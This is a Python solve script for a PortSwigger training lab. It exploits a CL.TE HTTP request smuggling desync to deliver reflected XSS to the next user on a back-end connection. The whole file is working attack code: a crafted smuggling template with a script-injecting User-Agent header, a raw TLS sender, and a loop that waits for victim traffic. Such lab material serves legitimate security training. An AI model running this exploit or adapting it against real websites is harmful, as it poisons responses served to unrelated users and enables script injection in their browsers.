#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Exploiting HTTP request smuggling to deliver reflected XSS.

The blog post page reflects the User-Agent header into a hidden input in the
comment form. We smuggle a GET /post?postId=5 with a malicious User-Agent so
the next user's request on the back-end connection receives the XSS-laden
response.

Raw TLS sockets throughout.
"""

import argparse
import socket
import ssl
import time
from urllib.parse import urlparse


SMUGGLE_TEMPLATE = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 150\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /post?postId=5 HTTP/1.1\r\n"
    "User-Agent: a\"/><script>alert(1)</script>\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 5\r\n"
    "\r\n"
    "x=1"
)


def send_once(host: str, port: int, body: bytes) -> bytes:
    ctx = ssl.create_default_context()
    with socket.create_connection((host, port), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.settimeout(5)
            ssock.sendall(body)
            data = b""
            try:
                while True:
                    chunk = ssock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if len(data) > 1000:
                        break
            except socket.timeout:
                pass
            return data


def check_solved(lab_url: str) -> bool:
    """Poll the lab home page for the solved banner."""
    import urllib.request
    req = urllib.request.Request(lab_url)
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            html = resp.read().decode(errors="replace")
            return "is-solved" in html or "Congratulations" in html
    except Exception:
        return False


def main():
    parser = argparse.ArgumentParser(
        description="Solve HTTP Request Smuggling Lab 10 (deliver reflected XSS)"
    )
    parser.add_argument("lab_url", help="Lab URL")
    parser.add_argument("--attempts", type=int, default=6, help="How many send-wait cycles")
    args = parser.parse_args()

    parsed = urlparse(args.lab_url)
    host = parsed.hostname
    port = parsed.port or 443

    body = SMUGGLE_TEMPLATE.format(host=host).encode()
    assert len(body) == 150 + len(f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 150\r\nTransfer-Encoding: chunked\r\n\r\n".encode()), (
        "Body byte-count check failed"
    )

    for i in range(1, args.attempts + 1):
        print(f"\n[*] Attempt {i}/{args.attempts}: sending smuggle to {host}:{port}")
        resp = send_once(host, port, body)
        status = resp.split(b"\r\n", 1)[0].decode(errors="replace") if resp else "<empty>"
        print(f"    Response: {status}")

        print(f"    Waiting 45s for admin traffic...")
        time.sleep(45)

        if check_solved(args.lab_url.rstrip("/")):
            print("\n[+] Lab solved!")
            return

    print("\n[-] Lab not solved after all attempts. Try more or re-check payload.")


if __name__ == "__main__":
    main()
